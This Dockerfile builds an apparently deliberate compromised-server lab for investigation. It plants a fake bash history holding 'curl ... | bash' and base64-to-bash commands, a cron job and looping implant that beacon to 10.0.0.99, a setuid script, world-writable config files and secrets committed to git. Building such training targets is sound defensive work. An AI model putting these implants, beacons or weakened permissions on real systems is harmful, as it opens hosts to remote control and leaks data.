FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -y && apt-get install -y openssh-server sudo curl wget git nodejs npm python3 python3-pip bc net-tools procps cron vim nano \
    file binutils xxd rsync && rm -rf /var/lib/apt/lists/*
RUN mkdir /var/run/sshd
RUN echo 'PermitRootLogin no' >> /etc/ssh/sshd_config
RUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
RUN useradd -m -s /bin/bash spider && echo 'spider:webslinger2026' | chpasswd && usermod -aG sudo spider
RUN useradd -m -s /bin/bash karthik && echo 'karthik:x' | chpasswd
RUN useradd -m -s /bin/bash priya && echo 'priya:x' | chpasswd
RUN echo 'curl http://10.0.0.99/implant.sh | bash' >> /home/karthik/.bash_history && echo 'chmod 777 /var/www/spider-app' >> /home/karthik/.bash_history && \
    echo 'base64 -d /var/www/spider-app/scripts/cleanup.sh | bash' >> /home/karthik/.bash_history && \
    echo 'echo "*/5 * * * * root curl -s http://10.0.0.99/collect | bash" > /etc/cron.d/.spider-diag' >> /home/karthik/.bash_history && \
    chown karthik:karthik /home/karthik/.bash_history && chmod 600 /home/karthik/.bash_history
RUN mkdir -p /var/www/spider-app/{scripts,config,src,logs} && mkdir -p /var/log/spider && mkdir -p /backups/spider
COPY --chown=root:root Task1/scripts/ /var/www/spider-app/scripts/
COPY --chown=root:root Task1/config/ /var/www/spider-app/config/
COPY --chown=root:root Task1/src/ /var/www/spider-app/src/
COPY --chown=root:root Task1/root/ /var/www/spider-app/
RUN chmod o+w /var/www/spider-app/scripts/backup.sh
RUN chmod o+w /var/www/spider-app/config/.env
RUN chmod o+w /var/log/spider
RUN chmod u+s /var/www/spider-app/scripts/cleanup.sh
RUN chmod 755 /var/www/spider-app/scripts/deploy.sh
RUN chmod 755 /var/www/spider-app/scripts/init.sh
RUN chmod 755 /var/www/spider-app/scripts/monitor.sh
RUN cp /bin/ls /var/www/spider-app/scripts/healthcheck.sh && \
    chmod 755 /var/www/spider-app/scripts/healthcheck.sh
RUN cd /var/www/spider-app && git init && git config user.email "priya@spider-internal.dev" && \
    git config user.name "Priya" && git add -A && git commit -m "initial commit — app setup" || true && \
    git config user.email "karthik@spider-internal.dev" && git config user.name "Karthik" && \
    git add -f scripts/cleanup.sh scripts/monitor.sh config/.secrets || true && \
    git commit -m "added diagnostics and monitoring [hotfix dec-12]" || true && \
    git config user.email "priya@spider-internal.dev" && git config user.name "Priya" && \
    git add .gitignore || true && git commit -m "updated gitignore — excluding build artifacts" || true
RUN echo '*/5 * * * * root curl -s http://10.0.0.99:8080/collect?host=$(hostname) >> /tmp/.spider-beacon.log 2>&1' \
    > /etc/cron.d/.spider-diag && chmod 644 /etc/cron.d/.spider-diag
RUN mkdir -p /tmp/.spider && echo '#!/bin/bash' > /tmp/.spider/.implant && \
    echo 'while true; do curl -s http://10.0.0.99:8080/beacon; sleep 300; done' >> /tmp/.spider/.implant && chmod +x /tmp/.spider/.implant
RUN chown -R spider:spider /var/www/spider-app && chown spider:spider /var/log/spider
RUN echo 'cd /var/www/spider-app' >> /home/spider/.bashrc
COPY motd.txt /etc/motd
RUN echo 'cat /etc/motd' >> /home/spider/.bashrc

EXPOSE 22

CMD service cron start && /usr/sbin/sshd -D